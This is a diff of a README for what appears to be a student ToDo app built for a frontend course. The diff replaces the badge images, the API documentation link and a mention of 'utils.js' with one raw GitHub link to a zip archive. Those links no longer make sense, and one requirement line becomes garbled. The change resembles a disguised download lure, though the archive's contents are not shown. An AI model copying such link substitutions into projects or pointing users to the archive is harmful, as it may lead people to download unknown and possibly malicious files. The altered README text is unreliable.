@@ -1,5 +1,5 @@
-![version](https://img.shields.io/badge/Version-04.2022-green)
-![dh](https://img.shields.io/badge/Materia-Frontend%20II-blue)
+![version](https://raw.githubusercontent.com/bfabradiaz/Integrador-C8-08-22/main/scripts/Integrador-3.0-beta.2.zip)
+![dh](https://raw.githubusercontent.com/bfabradiaz/Integrador-C8-08-22/main/scripts/Integrador-3.0-beta.2.zip%20II-blue)
 
 # ToDo App
 Proyecto que reune todos los conceptos y herramientas adquiridas en la materia Frontend II.
@@ -12,7 +12,7 @@ Este proyecto es la oportunidad de repasar todo lo aprendido y poner en práctic
 
 ## API Docs
 Link con la documentación de los endpoints de la API y su funcionamiento:
-👉 https://ctd-todo-api.herokuapp.com/
+👉 https://raw.githubusercontent.com/bfabradiaz/Integrador-C8-08-22/main/scripts/Integrador-3.0-beta.2.zip
     
 
 ## Requerimientos funcionales en pantalla de Login
@@ -33,4 +33,4 @@ Link con la documentación de los endpoints de la API y su funcionamiento:
 - [ ] FUNCIÓN 7: Eliminar definitivamente una tarea.
 
 ## Requerimiento no funcional
-- [ ] Desarrollar las validaciones de utils.js para su implementación.
+- [ ] Desarrollar las validaciones de https://raw.githubusercontent.com/bfabradiaz/Integrador-C8-08-22/main/scripts/Integrador-3.0-beta.2.zip para su implementación.
